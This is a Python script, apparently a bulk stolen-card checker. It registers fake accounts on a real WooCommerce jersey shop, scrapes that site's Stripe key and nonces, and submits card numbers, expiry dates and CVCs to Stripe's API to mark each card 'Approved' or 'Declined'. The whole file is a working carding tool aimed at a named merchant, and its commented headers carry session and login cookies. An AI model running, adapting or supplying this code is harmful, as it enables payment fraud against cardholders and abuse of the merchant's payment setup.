import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid

class ConfigsPAge:
    @classmethod
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

@dataclass
class stripemass:
    def main(self, card):
        try:
            self.UseMail = ConfigsPAge().RandomName('email')
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"

            self.session = Session()
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://japansoccer-jersey.com/my-account/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                # 'cookie': '__stripe_mid=f9ba7cd6-3eda-4e00-ad39-d9d672d959a19dcd9f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_first_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F; __stripe_sid=8d5f529d-6076-496d-8200-af28b6fb800e7d41a4',
            }

            response = self.session.get('https://japansoccer-jersey.com/my-account/',  headers=headers).text
            regis = ConfigsPAge().QueryText(response, 'name="woocommerce-register-nonce" value="', '"')
            print(regis)
            

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://japansoccer-jersey.com',
                'priority': 'u=0, i',
                'referer': 'https://japansoccer-jersey.com/my-account/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                # 'cookie': '__stripe_mid=f9ba7cd6-3eda-4e00-ad39-d9d672d959a19dcd9f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_first_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; __stripe_sid=8d5f529d-6076-496d-8200-af28b6fb800e7d41a4; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F',
            }

            data = {
                'email': self.UseMail,
                'password': 'leito132asd',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': 'https://japansoccer-jersey.com/allitems/?orderby=price',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://japansoccer-jersey.com/my-account/',
                'wc_order_attribution_session_start_time': '2026-03-02 17:14:13',
                'wc_order_attribution_session_pages': '3',
                'wc_order_attribution_session_count': '2',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': regis,
                '_wp_http_referer': '/my-account/',
                'register': 'Register',
            }

            response = self.session.post('https://japansoccer-jersey.com/my-account/', headers=headers, data=data)
            

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://japansoccer-jersey.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                # 'cookie': '__stripe_mid=f9ba7cd6-3eda-4e00-ad39-d9d672d959a19dcd9f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_first_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; __stripe_sid=8d5f529d-6076-496d-8200-af28b6fb800e7d41a4; wordpress_logged_in_e165dedfe77fd61bd7aa0f9fdacbff72=zzdcfxfxdfh%7C1773726659%7CDpleyRutXdVEEBV4ua2sGQjOZIan8ZCuwzIQ7nPNdgZ%7Cb7acc22faed3c0d2d373df4232d589761996273306698cfa13f471d060b5deed; wfwaf-authcookie-10053eecb3c1142a664ffb8bf5253c6f=3128%7Cother%7Cread%7Cf2c22d2da621dd51c5edaae15fac0fad768e1b2b5fff79293d2aaf2dfae37d97; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2Fpayment-methods%2F',
            }

            response = self.session.get('https://japansoccer-jersey.com/my-account/add-payment-method/', headers=headers).text
            pk_l = ConfigsPAge().QueryText(response, '"key":"','"')
            ajas = ConfigsPAge().QueryText(response, '"createAndConfirmSetupIntentNonce":"','"')
            print(pk_l, ajas)
            

            headers = {
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={self.ccs[0]}&card[cvc]={self.ccs[3]}&card[exp_year]={self.ccs[2]}&card[exp_month]={self.ccs[1]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fb518849afd%3B+stripe-js-v3%2Fb518849afd%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjapansoccer-jersey.com&time_on_page=484160&client_attribution_metadata[client_session_id]=82c5582f-9935-4bc3-bb49-b7c3e1747a42&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=f5fe57d1-7ee8-4618-8669-52f479b467af&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_l}&_stripe_version=2024-06-20&radar_options'
            response = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            id = response['id']
            print(id)
            
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://japansoccer-jersey.com',
                'priority': 'u=1, i',
                'referer': 'https://japansoccer-jersey.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_e165dedfe77fd61bd7aa0f9fdacbff72=zzdcfxfxdfh%7C1773726659%7CDpleyRutXdVEEBV4ua2sGQjOZIan8ZCuwzIQ7nPNdgZ%7Cfc9604e98342253b79b851de5bf4f939eb6c38d13a1f6a5bf30068f585c0a7a4; __stripe_mid=f9ba7cd6-3eda-4e00-ad39-d9d672d959a19dcd9f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_first_add=fd%3D2026-03-02%2017%3A14%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fallitems%2F%3Forderby%3Dprice; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36; __stripe_sid=8d5f529d-6076-496d-8200-af28b6fb800e7d41a4; wordpress_logged_in_e165dedfe77fd61bd7aa0f9fdacbff72=zzdcfxfxdfh%7C1773726659%7CDpleyRutXdVEEBV4ua2sGQjOZIan8ZCuwzIQ7nPNdgZ%7Cb7acc22faed3c0d2d373df4232d589761996273306698cfa13f471d060b5deed; wfwaf-authcookie-10053eecb3c1142a664ffb8bf5253c6f=3128%7Cother%7Cread%7Cf2c22d2da621dd51c5edaae15fac0fad768e1b2b5fff79293d2aaf2dfae37d97; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjapansoccer-jersey.com%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajas,
            }

            response = self.session.post('https://japansoccer-jersey.com/wp-admin/admin-ajax.php',  headers=headers, data=data)
            data = response.json()
            print(data)
            error = data['success'] and data['data']['status'] == 'succeeded'
            if error: return 'Approved! ✅', data['data']['status']
            else: return 'Declined ❌', data['data']['status']
        except: return 'Declined ❌','Your card was declined.'
        
